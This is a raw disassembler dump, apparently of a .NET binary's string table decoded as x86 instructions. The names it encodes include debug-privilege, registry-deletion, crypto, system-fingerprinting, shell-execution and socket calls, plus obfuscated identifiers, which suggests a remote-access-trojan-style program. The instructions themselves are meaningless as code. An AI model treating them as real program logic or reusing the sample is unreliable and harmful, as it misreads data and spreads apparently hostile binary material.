  408561:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408565:	70 6c                	jo     0x4085d3
  408567:	61                   	popa
  408568:	63 65 00             	arpl   %esp,0x0(%ebp)
  40856b:	43                   	inc    %ebx
  40856c:	72 65                	jb     0x4085d3
  40856e:	61                   	popa
  40856f:	74 65                	je     0x4085d6
  408571:	49                   	dec    %ecx
  408572:	6e                   	outsb  %ds:(%esi),(%dx)
  408573:	73 74                	jae    0x4085e9
  408575:	61                   	popa
  408576:	6e                   	outsb  %ds:(%esi),(%dx)
  408577:	63 65 00             	arpl   %esp,0x0(%ebp)
  40857a:	73 65                	jae    0x4085e1
  40857c:	74 5f                	je     0x4085dd
  40857e:	4d                   	dec    %ebp
  40857f:	6f                   	outsl  %ds:(%esi),(%dx)
  408580:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408585:	6c                   	insb   (%dx),%es:(%edi)
  408586:	65 4d                	gs dec %ebp
  408588:	6f                   	outsl  %ds:(%esi),(%dx)
  408589:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  40858e:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408595:	64 65 
  408597:	00 45 6e             	add    %al,0x6e(%ebp)
  40859a:	74 65                	je     0x408601
  40859c:	72 44                	jb     0x4085e2
  40859e:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4085a2:	4d                   	dec    %ebp
  4085a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4085a4:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  4085a9:	79 70                	jns    0x40861b
  4085ab:	74 6f                	je     0x40861c
  4085ad:	53                   	push   %ebx
  4085ae:	74 72                	je     0x408622
  4085b0:	65 61                	gs popa
  4085b2:	6d                   	insl   (%dx),%es:(%edi)
  4085b3:	4d                   	dec    %ebp
  4085b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b5:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4085ba:	6d                   	insl   (%dx),%es:(%edi)
  4085bb:	70 72                	jo     0x40862f
  4085bd:	65 73 73             	gs jae 0x408633
  4085c0:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  4085c7:	00 43 69             	add    %al,0x69(%ebx)
  4085ca:	70 68                	jo     0x408634
  4085cc:	65 72 4d             	gs jb  0x40861c
  4085cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d0:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  4085d5:	6c                   	insb   (%dx),%es:(%edi)
  4085d6:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4085db:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4085e1:	65 74 65             	gs je  0x408649
  4085e4:	53                   	push   %ebx
  4085e5:	75 62                	jne    0x408649
  4085e7:	4b                   	dec    %ebx
  4085e8:	65 79 54             	gs jns 0x40863f
  4085eb:	72 65                	jb     0x408652
  4085ed:	65 00 42 45          	add    %al,%gs:0x45(%edx)
  4085f1:	79 4c                	jns    0x40863f
  4085f3:	46                   	inc    %esi
  4085f4:	55                   	push   %ebp
  4085f5:	61                   	popa
  4085f6:	67 7a 71             	addr16 jp 0x40866a
  4085f9:	74 66                	je     0x408661
  4085fb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4085ff:	74 5f                	je     0x408660
  408601:	4d                   	dec    %ebp
  408602:	65 73 73             	gs jae 0x408678
  408605:	61                   	popa
  408606:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  40860b:	76 6f                	jbe    0x40867c
  40860d:	6b 65 00 76          	imul   $0x76,0x0(%ebp),%esp
  408611:	6a 6e                	push   $0x6e
  408613:	76 68                	jbe    0x40867d
  408615:	6c                   	insb   (%dx),%es:(%edi)
  408616:	58                   	pop    %eax
  408617:	74 6b                	je     0x408684
  408619:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  40861d:	6e                   	outsb  %ds:(%esi),(%dx)
  40861e:	75 6d                	jne    0x40868d
  408620:	65 72 61             	gs jb  0x408684
  408623:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408627:	49                   	dec    %ecx
  408628:	44                   	inc    %esp
  408629:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408630:	6c                   	insb   (%dx),%es:(%edi)
  408631:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  408636:	6f                   	outsl  %ds:(%esi),(%dx)
  408637:	75 62                	jne    0x40869b
  408639:	6c                   	insb   (%dx),%es:(%edi)
  40863a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40863e:	74 5f                	je     0x40869f
  408640:	48                   	dec    %eax
  408641:	61                   	popa
  408642:	6e                   	outsb  %ds:(%esi),(%dx)
  408643:	64 6c                	fs insb (%dx),%es:(%edi)
  408645:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408649:	6e                   	outsb  %ds:(%esi),(%dx)
  40864a:	74 69                	je     0x4086b5
  40864c:	6d                   	insl   (%dx),%es:(%edi)
  40864d:	65 46                	gs inc %esi
  40864f:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  408656:	64 6c                	fs insb (%dx),%es:(%edi)
  408658:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40865c:	74 4d                	je     0x4086ab
  40865e:	6f                   	outsl  %ds:(%esi),(%dx)
  40865f:	64 75 6c             	fs jne 0x4086ce
  408662:	65 48                	gs dec %eax
  408664:	61                   	popa
  408665:	6e                   	outsb  %ds:(%esi),(%dx)
  408666:	64 6c                	fs insb (%dx),%es:(%edi)
  408668:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40866c:	6e                   	outsb  %ds:(%esi),(%dx)
  40866d:	74 69                	je     0x4086d8
  40866f:	6d                   	insl   (%dx),%es:(%edi)
  408670:	65 54                	gs push %esp
  408672:	79 70                	jns    0x4086e4
  408674:	65 48                	gs dec %eax
  408676:	61                   	popa
  408677:	6e                   	outsb  %ds:(%esi),(%dx)
  408678:	64 6c                	fs insb (%dx),%es:(%edi)
  40867a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40867e:	74 54                	je     0x4086d4
  408680:	79 70                	jns    0x4086f2
  408682:	65 46                	gs inc %esi
  408684:	72 6f                	jb     0x4086f5
  408686:	6d                   	insl   (%dx),%es:(%edi)
  408687:	48                   	dec    %eax
  408688:	61                   	popa
  408689:	6e                   	outsb  %ds:(%esi),(%dx)
  40868a:	64 6c                	fs insb (%dx),%es:(%edi)
  40868c:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  408690:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408697:	65 
  408698:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  40869c:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  4086a3:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  4086aa:	6e 
  4086ab:	52                   	push   %edx
  4086ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ad:	6c                   	insb   (%dx),%es:(%edi)
  4086ae:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  4086b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b3:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086b5:	77 73                	ja     0x40872a
  4086b7:	42                   	inc    %edx
  4086b8:	75 69                	jne    0x408723
  4086ba:	6c                   	insb   (%dx),%es:(%edi)
  4086bb:	74 49                	je     0x408706
  4086bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4086be:	52                   	push   %edx
  4086bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c0:	6c                   	insb   (%dx),%es:(%edi)
  4086c1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086c5:	74 5f                	je     0x408726
  4086c7:	4d                   	dec    %ebp
  4086c8:	61                   	popa
  4086c9:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4086d0:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4086d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086d8:	73 4d                	jae    0x408727
  4086da:	6f                   	outsl  %ds:(%esi),(%dx)
  4086db:	64 75 6c             	fs jne 0x40874a
  4086de:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4086e2:	74 5f                	je     0x408743
  4086e4:	57                   	push   %edi
  4086e5:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086ec:	79 6c                	jns    0x40875a
  4086ee:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4086f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086f6:	73 57                	jae    0x40874f
  4086f8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4086ff:	79 6c                	jns    0x40876d
  408701:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408705:	74 5f                	je     0x408766
  408707:	4e                   	dec    %esi
  408708:	61                   	popa
  408709:	6d                   	insl   (%dx),%es:(%edi)
  40870a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40870e:	74 5f                	je     0x40876f
  408710:	46                   	inc    %esi
  408711:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408718:	00 
  408719:	73 65                	jae    0x408780
  40871b:	74 5f                	je     0x40877c
  40871d:	46                   	inc    %esi
  40871e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408725:	00 
  408726:	47                   	inc    %edi
  408727:	65 74 54             	gs je  0x40877e
  40872a:	65 6d                	gs insl (%dx),%es:(%edi)
  40872c:	70 46                	jo     0x408774
  40872e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408735:	00 
  408736:	47                   	inc    %edi
  408737:	65 74 46             	gs je  0x408780
  40873a:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408741:	00 
  408742:	67 65 74 5f          	addr16 gs je 0x4087a5
  408746:	4d                   	dec    %ebp
  408747:	61                   	popa
  408748:	63 68 69             	arpl   %ebp,0x69(%eax)
  40874b:	6e                   	outsb  %ds:(%esi),(%dx)
  40874c:	65 4e                	gs dec %esi
  40874e:	61                   	popa
  40874f:	6d                   	insl   (%dx),%es:(%edi)
  408750:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408754:	74 5f                	je     0x4087b5
  408756:	4f                   	dec    %edi
  408757:	53                   	push   %ebx
  408758:	46                   	inc    %esi
  408759:	75 6c                	jne    0x4087c7
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	4e                   	dec    %esi
  40875d:	61                   	popa
  40875e:	6d                   	insl   (%dx),%es:(%edi)
  40875f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408763:	74 5f                	je     0x4087c4
  408765:	46                   	inc    %esi
  408766:	75 6c                	jne    0x4087d4
  408768:	6c                   	insb   (%dx),%es:(%edi)
  408769:	4e                   	dec    %esi
  40876a:	61                   	popa
  40876b:	6d                   	insl   (%dx),%es:(%edi)
  40876c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408770:	74 5f                	je     0x4087d1
  408772:	55                   	push   %ebp
  408773:	73 65                	jae    0x4087da
  408775:	72 4e                	jb     0x4087c5
  408777:	61                   	popa
  408778:	6d                   	insl   (%dx),%es:(%edi)
  408779:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  40877d:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408781:	6f                   	outsl  %ds:(%esi),(%dx)
  408782:	73 74                	jae    0x4087f8
  408784:	4e                   	dec    %esi
  408785:	61                   	popa
  408786:	6d                   	insl   (%dx),%es:(%edi)
  408787:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  40878c:	65 54                	gs push %esp
  40878e:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408795:	5f                   	pop    %edi
  408796:	4c                   	dec    %esp
  408797:	61                   	popa
  408798:	73 74                	jae    0x40880e
  40879a:	57                   	push   %edi
  40879b:	72 69                	jb     0x408806
  40879d:	74 65                	je     0x408804
  40879f:	54                   	push   %esp
  4087a0:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  4087a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4087a8:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  4087af:	54                   	push   %esp
  4087b0:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  4087b7:	74 65                	je     0x40881e
  4087b9:	4c                   	dec    %esp
  4087ba:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4087c1:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4087c4:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  4087c8:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4087cf:	6d                   	insl   (%dx),%es:(%edi)
  4087d0:	65 54                	gs push %esp
  4087d2:	79 70                	jns    0x408844
  4087d4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087d8:	74 5f                	je     0x408839
  4087da:	56                   	push   %esi
  4087db:	61                   	popa
  4087dc:	6c                   	insb   (%dx),%es:(%edi)
  4087dd:	75 65                	jne    0x408844
  4087df:	54                   	push   %esp
  4087e0:	79 70                	jns    0x408852
  4087e2:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4087e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e7:	74 6f                	je     0x408858
  4087e9:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4087ec:	54                   	push   %esp
  4087ed:	79 70                	jns    0x40885f
  4087ef:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4087f3:	74 54                	je     0x408849
  4087f5:	79 70                	jns    0x408867
  4087f7:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4087fb:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4087fe:	74 54                	je     0x408854
  408800:	79 70                	jns    0x408872
  408802:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408806:	6c                   	insb   (%dx),%es:(%edi)
  408807:	65 53                	gs push %ebx
  408809:	68 61 72 65 00       	push   $0x657261
  40880e:	53                   	push   %ebx
  40880f:	79 73                	jns    0x408884
  408811:	74 65                	je     0x408878
  408813:	6d                   	insl   (%dx),%es:(%edi)
  408814:	2e 43                	cs inc %ebx
  408816:	6f                   	outsl  %ds:(%esi),(%dx)
  408817:	72 65                	jb     0x40887e
  408819:	00 43 6c             	add    %al,0x6c(%ebx)
  40881c:	6f                   	outsl  %ds:(%esi),(%dx)
  40881d:	73 65                	jae    0x408884
  40881f:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408823:	70 6f                	jo     0x408894
  408825:	73 65                	jae    0x40888c
  408827:	00 50 61             	add    %dl,0x61(%eax)
  40882a:	72 73                	jb     0x40889f
  40882c:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408830:	72 52                	jb     0x408884
  408832:	65 76 65             	gs jbe 0x40889a
  408835:	72 73                	jb     0x4088aa
  408837:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  40883b:	30 39                	xor    %bh,(%ecx)
  40883d:	43                   	inc    %ebx
  40883e:	65 72 74             	gs jb  0x4088b5
  408841:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408848:	00 43 72             	add    %al,0x72(%ebx)
  40884b:	65 61                	gs popa
  40884d:	74 65                	je     0x4088b4
  40884f:	00 53 65             	add    %dl,0x65(%ebx)
  408852:	74 54                	je     0x4088a8
  408854:	68 72 65 61 64       	push   $0x64616572
  408859:	45                   	inc    %ebp
  40885a:	78 65                	js     0x4088c1
  40885c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40885f:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408866:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40886b:	65 74 65             	gs je  0x4088d3
  40886e:	00 43 61             	add    %al,0x61(%ebx)
  408871:	6c                   	insb   (%dx),%es:(%edi)
  408872:	6c                   	insb   (%dx),%es:(%edi)
  408873:	53                   	push   %ebx
  408874:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40887b:	74 
  40887c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408880:	6d                   	insl   (%dx),%es:(%edi)
  408881:	70 69                	jo     0x4088ec
  408883:	6c                   	insb   (%dx),%es:(%edi)
  408884:	65 72 47             	gs jb  0x4088ce
  408887:	65 6e                	outsb  %gs:(%esi),(%dx)
  408889:	65 72 61             	gs jb  0x4088ed
  40888c:	74 65                	je     0x4088f3
  40888e:	64 41                	fs inc %ecx
  408890:	74 74                	je     0x408906
  408892:	72 69                	jb     0x4088fd
  408894:	62 75 74             	bound  %esi,0x74(%ebp)
  408897:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40889c:	75 67                	jne    0x408905
  40889e:	67 61                	addr16 popa
  4088a0:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4088a4:	74 74                	je     0x40891a
  4088a6:	72 69                	jb     0x408911
  4088a8:	62 75 74             	bound  %esi,0x74(%ebp)
  4088ab:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4088af:	6d                   	insl   (%dx),%es:(%edi)
  4088b0:	56                   	push   %esi
  4088b1:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4088b8:	74 74                	je     0x40892e
  4088ba:	72 69                	jb     0x408925
  4088bc:	62 75 74             	bound  %esi,0x74(%ebp)
  4088bf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088c3:	73 65                	jae    0x40892a
  4088c5:	6d                   	insl   (%dx),%es:(%edi)
  4088c6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4088ca:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  4088d1:	72 
  4088d2:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4088d9:	73 73                	jae    0x40894e
  4088db:	65 6d                	gs insl (%dx),%es:(%edi)
  4088dd:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4088e1:	72 61                	jb     0x408944
  4088e3:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4088e6:	61                   	popa
  4088e7:	72 6b                	jb     0x408954
  4088e9:	41                   	inc    %ecx
  4088ea:	74 74                	je     0x408960
  4088ec:	72 69                	jb     0x408957
  4088ee:	62 75 74             	bound  %esi,0x74(%ebp)
  4088f1:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4088f6:	67 65 74 46          	addr16 gs je 0x408940
  4088fa:	72 61                	jb     0x40895d
  4088fc:	6d                   	insl   (%dx),%es:(%edi)
  4088fd:	65 77 6f             	gs ja  0x40896f
  408900:	72 6b                	jb     0x40896d
  408902:	41                   	inc    %ecx
  408903:	74 74                	je     0x408979
  408905:	72 69                	jb     0x408970
  408907:	62 75 74             	bound  %esi,0x74(%ebp)
  40890a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40890e:	73 65                	jae    0x408975
  408910:	6d                   	insl   (%dx),%es:(%edi)
  408911:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  408915:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40891c:	69 
  40891d:	6f                   	outsl  %ds:(%esi),(%dx)
  40891e:	6e                   	outsb  %ds:(%esi),(%dx)
  40891f:	41                   	inc    %ecx
  408920:	74 74                	je     0x408996
  408922:	72 69                	jb     0x40898d
  408924:	62 75 74             	bound  %esi,0x74(%ebp)
  408927:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40892b:	73 65                	jae    0x408992
  40892d:	6d                   	insl   (%dx),%es:(%edi)
  40892e:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408932:	6f                   	outsl  %ds:(%esi),(%dx)
  408933:	6e                   	outsb  %ds:(%esi),(%dx)
  408934:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  40893a:	74 69                	je     0x4089a5
  40893c:	6f                   	outsl  %ds:(%esi),(%dx)
  40893d:	6e                   	outsb  %ds:(%esi),(%dx)
  40893e:	41                   	inc    %ecx
  40893f:	74 74                	je     0x4089b5
  408941:	72 69                	jb     0x4089ac
  408943:	62 75 74             	bound  %esi,0x74(%ebp)
  408946:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40894a:	73 65                	jae    0x4089b1
  40894c:	6d                   	insl   (%dx),%es:(%edi)
  40894d:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408951:	65 73 63             	gs jae 0x4089b7
  408954:	72 69                	jb     0x4089bf
  408956:	70 74                	jo     0x4089cc
  408958:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40895f:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  408966:	65 66 61             	gs popaw
  408969:	75 6c                	jne    0x4089d7
  40896b:	74 4d                	je     0x4089ba
  40896d:	65 6d                	gs insl (%dx),%es:(%edi)
  40896f:	62 65 72             	bound  %esp,0x72(%ebp)
  408972:	41                   	inc    %ecx
  408973:	74 74                	je     0x4089e9
  408975:	72 69                	jb     0x4089e0
  408977:	62 75 74             	bound  %esi,0x74(%ebp)
  40897a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40897e:	6d                   	insl   (%dx),%es:(%edi)
  40897f:	70 69                	jo     0x4089ea
  408981:	6c                   	insb   (%dx),%es:(%edi)
  408982:	61                   	popa
  408983:	74 69                	je     0x4089ee
  408985:	6f                   	outsl  %ds:(%esi),(%dx)
  408986:	6e                   	outsb  %ds:(%esi),(%dx)
  408987:	52                   	push   %edx
  408988:	65 6c                	gs insb (%dx),%es:(%edi)
  40898a:	61                   	popa
  40898b:	78 61                	js     0x4089ee
  40898d:	74 69                	je     0x4089f8
  40898f:	6f                   	outsl  %ds:(%esi),(%dx)
  408990:	6e                   	outsb  %ds:(%esi),(%dx)
  408991:	73 41                	jae    0x4089d4
  408993:	74 74                	je     0x408a09
  408995:	72 69                	jb     0x408a00
  408997:	62 75 74             	bound  %esi,0x74(%ebp)
  40899a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40899e:	73 65                	jae    0x408a05
  4089a0:	6d                   	insl   (%dx),%es:(%edi)
  4089a1:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4089a5:	72 6f                	jb     0x408a16
  4089a7:	64 75 63             	fs jne 0x408a0d
  4089aa:	74 41                	je     0x4089ed
  4089ac:	74 74                	je     0x408a22
  4089ae:	72 69                	jb     0x408a19
  4089b0:	62 75 74             	bound  %esi,0x74(%ebp)
  4089b3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089b7:	73 65                	jae    0x408a1e
  4089b9:	6d                   	insl   (%dx),%es:(%edi)
  4089ba:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4089be:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bf:	70 79                	jo     0x408a3a
  4089c1:	72 69                	jb     0x408a2c
  4089c3:	67 68 74 41 74 74    	addr16 push $0x74744174
  4089c9:	72 69                	jb     0x408a34
  4089cb:	62 75 74             	bound  %esi,0x74(%ebp)
  4089ce:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089d2:	73 65                	jae    0x408a39
  4089d4:	6d                   	insl   (%dx),%es:(%edi)
  4089d5:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4089d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089da:	6d                   	insl   (%dx),%es:(%edi)
  4089db:	70 61                	jo     0x408a3e
  4089dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4089de:	79 41                	jns    0x408a21
  4089e0:	74 74                	je     0x408a56
  4089e2:	72 69                	jb     0x408a4d
  4089e4:	62 75 74             	bound  %esi,0x74(%ebp)
  4089e7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4089eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ec:	74 69                	je     0x408a57
  4089ee:	6d                   	insl   (%dx),%es:(%edi)
  4089ef:	65 43                	gs inc %ebx
  4089f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f2:	6d                   	insl   (%dx),%es:(%edi)
  4089f3:	70 61                	jo     0x408a56
  4089f5:	74 69                	je     0x408a60
  4089f7:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4089fa:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408a01:	69 
  408a02:	62 75 74             	bound  %esi,0x74(%ebp)
  408a05:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408a09:	74 5f                	je     0x408a6a
  408a0b:	55                   	push   %ebp
  408a0c:	73 65                	jae    0x408a73
  408a0e:	53                   	push   %ebx
  408a0f:	68 65 6c 6c 45       	push   $0x456c6c65
  408a14:	78 65                	js     0x408a7b
  408a16:	63 75 74             	arpl   %esi,0x74(%ebp)
  408a19:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408a1d:	61                   	popa
  408a1e:	64 42                	fs inc %edx
  408a20:	79 74                	jns    0x408a96
  408a22:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408a26:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408a2d:	00 
  408a2e:	44                   	inc    %esp
  408a2f:	65 6c                	gs insb (%dx),%es:(%edi)
  408a31:	65 74 65             	gs je  0x408a99
  408a34:	56                   	push   %esi
  408a35:	61                   	popa
  408a36:	6c                   	insb   (%dx),%es:(%edi)
  408a37:	75 65                	jne    0x408a9e
  408a39:	00 47 65             	add    %al,0x65(%edi)
  408a3c:	74 56                	je     0x408a94
  408a3e:	61                   	popa
  408a3f:	6c                   	insb   (%dx),%es:(%edi)
  408a40:	75 65                	jne    0x408aa7
  408a42:	00 53 65             	add    %dl,0x65(%ebx)
  408a45:	74 56                	je     0x408a9d
  408a47:	61                   	popa
  408a48:	6c                   	insb   (%dx),%es:(%edi)
  408a49:	75 65                	jne    0x408ab0
  408a4b:	00 67 65             	add    %ah,0x65(%edi)
  408a4e:	74 5f                	je     0x408aaf
  408a50:	4b                   	dec    %ebx
  408a51:	65 65 70 41          	gs gs jo 0x408a96
  408a55:	6c                   	insb   (%dx),%es:(%edi)
  408a56:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a5d:	5f                   	pop    %edi
  408a5e:	4b                   	dec    %ebx
  408a5f:	65 65 70 41          	gs gs jo 0x408aa4
  408a63:	6c                   	insb   (%dx),%es:(%edi)
  408a64:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408a6b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a6c:	76 65                	jbe    0x408ad3
  408a6e:	00 73 65             	add    %dh,0x65(%ebx)
  408a71:	74 5f                	je     0x408ad2
  408a73:	42                   	inc    %edx
  408a74:	6c                   	insb   (%dx),%es:(%edi)
  408a75:	6f                   	outsl  %ds:(%esi),(%dx)
  408a76:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408a79:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a80:	5f                   	pop    %edi
  408a81:	54                   	push   %esp
  408a82:	6f                   	outsl  %ds:(%esi),(%dx)
  408a83:	74 61                	je     0x408ae6
  408a85:	6c                   	insb   (%dx),%es:(%edi)
  408a86:	53                   	push   %ebx
  408a87:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a8e:	5f                   	pop    %edi
  408a8f:	48                   	dec    %eax
  408a90:	65 61                	gs popa
  408a92:	64 65 72 53          	fs gs jb 0x408ae9
  408a96:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a9d:	5f                   	pop    %edi
  408a9e:	48                   	dec    %eax
  408a9f:	65 61                	gs popa
  408aa1:	64 65 72 53          	fs gs jb 0x408af8
  408aa5:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408aac:	5f                   	pop    %edi
  408aad:	53                   	push   %ebx
  408aae:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ab0:	64 42                	fs inc %edx
  408ab2:	75 66                	jne    0x408b1a
  408ab4:	66 65 72 53          	data16 gs jb 0x408b0b
  408ab8:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408abf:	5f                   	pop    %edi
  408ac0:	52                   	push   %edx
  408ac1:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408ac5:	76 65                	jbe    0x408b2c
  408ac7:	42                   	inc    %edx
  408ac8:	75 66                	jne    0x408b30
  408aca:	66 65 72 53          	data16 gs jb 0x408b21
  408ace:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
